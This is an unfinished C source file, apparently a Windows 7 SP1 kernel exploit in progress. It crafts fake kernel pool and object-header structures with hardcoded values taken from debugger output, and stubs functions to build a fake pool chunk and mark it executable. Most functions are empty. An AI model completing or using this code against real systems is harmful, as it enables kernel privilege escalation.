#include "exploit.h"

void initialize_pool_header_w7_SP1(PPOOL_HEADER_W7_SP1 input_pool_header)
{
	POOL_HEADER_W7_SP1 pool_header = *input_pool_header;	// dt nt!_POOL_HEADER fffffa80c14f72d0 

	pool_header.Ulong1 = 0x202002c;							// Structure Offset: +0x0, Overall Offset: +0x0
	pool_header.PoolTag = 0x4B677844;						// Structure Offset: +0x4, Overall Offset: +0x4
	pool_header.ProcessBilled = 0;							// Structure Offset: +0x8, Overall Offset: +0x8

	*input_pool_header = pool_header;
}

void initialize_object_header_quota_w7_SP1(POBJECT_HEADER_QUOTA_INFO_W7_SP1 input_object_header_quota)
{
	OBJECT_HEADER_QUOTA_INFO_W7_SP1 object_header_quota = *input_object_header_quota;	// dt nt!_OBJECT_HEADER_QUOTA_INFO fffffa80c14f72d0+0x10

	object_header_quota.PagedPoolCharge = 0x2100002;									// Structure Offset: +0x0, Overall Offset: +0x10
	object_header_quota.NonPagedPoolCharge = 0x69656C41;								// Structure Offset: +0x4, Overall Offset: +0x14
	object_header_quota.SecurityDescriptorCharge = 1;									// Structure Offset: +0x8, Overall Offset: +0x18
	// PADDING: 4 BYTES																	// Structure Offset: +0xC, Overall Offset: +0x1C
	object_header_quota.SecurityDescriptorQuotaBlock = (void*)0x69656C41060F0001;		// Structure Offset: +0x10, Overall Offset: +0x20
	object_header_quota.Reserved = 0;													// Structure Offset: +0x18, Overall Offset: +0x28

	*input_object_header_quota = object_header_quota;
}

void initialize_quad_w7_SP1(PQUAD_W7_SP1 input_quad)
{

}

void initialize_ex_push_lock_w7_SP1(PEX_PUSH_LOCK_W7_SP1 input_ex_push_lock)
{

}

void initialize_object_create_information_w7_SP1(POBJECT_CREATE_INFORMATION_W7_SP1 input_object_create_information)
{

}

void initialize_object_header_w7_SP1(POBJECT_HEADER_W7_SP1 input_object_header, PEX_PUSH_LOCK_W7_SP1 input_ex_push_lock, PVOID input_heap_allocation_address, PQUAD_W7_SP1 input_quad, POBJECT_CREATE_INFORMATION_W7_SP1 input_object_create_information)
{
	OBJECT_HEADER_W7_SP1 object_header = *input_object_header;	// dt nt!_OBJECT_HEADER fffffa80c14f72d0+0x30

	// To be finished tomorrow...

	*input_object_header = object_header;
}

void initialize_main_pool_structs_w7_SP1(char* address, PPOOL_HEADER_W7_SP1 input_pool_header, POBJECT_HEADER_QUOTA_INFO_W7_SP1 input_object_header_quota, PEX_PUSH_LOCK_W7_SP1 input_push_lock, PQUAD_W7_SP1 input_quad, POBJECT_CREATE_INFORMATION_W7_SP1 input_object_create_information, POBJECT_HEADER_W7_SP1 input_object_header)
{

}

int mark_pool_structs_executable_w7_SP1(PPOOL_HEADER_W7_SP1 input_pool_header, POBJECT_HEADER_QUOTA_INFO_W7_SP1 input_object_header_quota, PEX_PUSH_LOCK_W7_SP1 input_push_lock, PQUAD_W7_SP1 input_quad, POBJECT_CREATE_INFORMATION_W7_SP1 input_object_create_information, POBJECT_HEADER_W7_SP1 input_object_header)
{

}

void build_pool_chunk_w7_SP1(char* fake_pool_memory_page, POOL_HEADER_W7_SP1 pool_header, OBJECT_HEADER_QUOTA_INFO_W7_SP1 object_header_quota_info, OBJECT_HEADER_W7_SP1 object_header)
{

}